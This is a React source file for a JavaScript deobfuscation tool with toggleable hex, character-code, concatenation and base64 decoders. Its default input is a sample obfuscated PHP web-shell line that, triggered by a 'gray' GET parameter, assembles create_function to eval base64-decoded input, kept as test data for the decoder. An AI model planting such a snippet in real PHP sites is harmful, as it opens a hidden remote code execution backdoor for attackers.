import React, { Component } from 'react';
import SplitterLayout from 'react-splitter-layout';
import 'react-splitter-layout/lib/index.css';
import { ButtonBar, UnTangler } from './index.js'

/**%%%%%%%%%%%%%%%%%%%%%%%% */
import worker from "./MyWorker.js"
import WebWorker from "./WorkerSetup";
/**%%%%%%%%%%%%%%%%%%%%%%%% */

/**
 * Main component,
 * Add a decoder to the untangler object,
 * add the decoder name to the decoders state
 * Buttons are generated and will decode the input string
 */
export default class Decoder extends Component {
    constructor(props) {
        super(props)
        this.state = {
            value: `if(isset($_GET["gray"])&&$_GET["gray"]=="gray"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));")`,
            decoded: '',
            decoders: {"hex": false, "fromChar": false, "fixConcats": false, "removeBadChars": false, "base64": false}
        }
    }
    HandleTextChange = (e) => {
        const target = e.target.value
        let x = this.unTangle(target)
        this.setState({value:target, decoded: x })
    }
    handleClick = (e) => {
        /**%%%%%%%%%%%%%%%%%%%%%%%% */
        this.WetWork()
    
        /**%%%%%%%%%%%%%%%%%%%%%%%% */


        //We need to update the state of decoders THEN decode the value and set state again
        const target = e.target.value
        const current = this.state.decoders
        current[target] = !current[target]
        this.setState({
            decoders:current
        },() => {
            this.setState({decoded: this.unTangle(this.state.value) })
        });
    }
    unTangle = (code) => {
        const unTangler = new UnTangler()
        const decoders = {...this.state.decoders}
        Object.keys(decoders).forEach((decoder,i)=> {
            if (this.state.decoders[decoder]){
                code = unTangler[decoder](code)
                console.warn(`untangler being used module: ${decoder}\n ${code}`)
            }
        })
        return code
    }
    disableButtons = () =>{
        const decoders = {...this.state.decoders}
        Object.keys(decoders).forEach((decoder,i)=> {
          decoders[decoders] = false
        })
        this.setState({decoders:decoders})
    }
    WetWork = () => {
        this.worker.postMessage("FilthyData");
        this.worker.addEventListener("hello", event => {
                console.log(event.data)
        });
    }

    componentDidMount = () => {
        this.worker = new WebWorker(worker)
        console.warn(this.worker)
    }
    render() {
        return (
            <div className="decoder">
                <div className="controls">
                    <ButtonBar
                        handleClick={(e) => {this.handleClick(e)}}
                        decoders={this.state.decoders}
                    />
                </div>
                <SplitterLayout>
                    <div className="input">
                        <textarea
                            className="input"
                            value={this.state.value}
                            onChange={(e) => { this.HandleTextChange(e) }}
                        />
                    </div>
                    <div>{this.state.decoded}</div>
                </SplitterLayout>
            </div>
        );
    }
}




